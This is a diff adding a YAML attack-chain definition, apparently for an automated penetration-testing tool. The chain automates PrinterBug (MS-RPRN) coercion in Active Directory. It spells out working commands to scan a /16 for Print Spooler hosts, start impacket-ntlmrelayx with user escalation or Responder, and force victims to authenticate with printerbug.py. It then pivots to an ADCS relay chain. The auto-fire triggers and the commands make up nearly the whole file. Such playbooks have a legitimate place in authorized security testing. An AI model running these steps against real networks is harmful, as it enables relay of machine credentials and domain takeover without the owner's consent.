@@ -1,0 +1,47 @@
+chain_id: printerbug_coercion
+title: "AD — PrinterBug coercion (MS-RPRN) to capture machine NTLM auth"
+severity: HIGH
+tags: [ad, coercion, printerbug, ms-rprn, ntlm-relay]
+
+trigger:
+  any_of:
+    - { kind: "domain_user_credentials" }
+    - { kind: "ad_coercion_candidate" }
+    - { banner_pattern: "(?i)windows\\s*server|domain\\s*controller|active\\s*directory|spoolsv" }
+    - { service_pattern: "(?i)kerberos|ldap|spoolss" }
+
+description: |
+  PrinterBug abuses the MS-RPRN spoolss interface: any authenticated
+  domain user can ask any host running the Print Spooler service to
+  authenticate to an attacker-controlled UNC path. Combined with
+  ntlmrelayx, this captures or relays the target's machine account
+  authentication.
+
+steps:
+  - id: 1
+    title: "Find Spooler-enabled hosts (typical: every DC, most Windows)"
+    command: |
+      netexec smb 10.10.0.0/16 -u USUARIO -p 'PASSWORD' -M spooler
+
+  - id: 2
+    title: "Stand up ntlmrelayx (if relaying) or Responder (if capturing)"
+    command: |
+      impacket-ntlmrelayx -t ldaps://$DC --escalate-user USUARIO -smb2support
+      # or:
+      sudo responder -I tun0
+
+  - id: 3
+    title: "Trigger the coercion with dementor.py / printerbug.py"
+    command: |
+      python3 printerbug.py $DOMAIN/USUARIO:'PASSWORD'@$VICTIMA $LISTENER
+
+  - id: 4
+    title: "Reuse the captured / relayed auth"
+    notes: |
+      ntlmrelayx will print escalation paths (RBCD on $LISTENER, LDAP
+      object writes, ADCS template). Pivot to chain
+      adcs_esc8_web_enrollment_relay if a CA is reachable.
+
+references:
+  - https://github.com/dirkjanm/krbrelayx
+  - https://github.com/leechristensen/SpoolSample
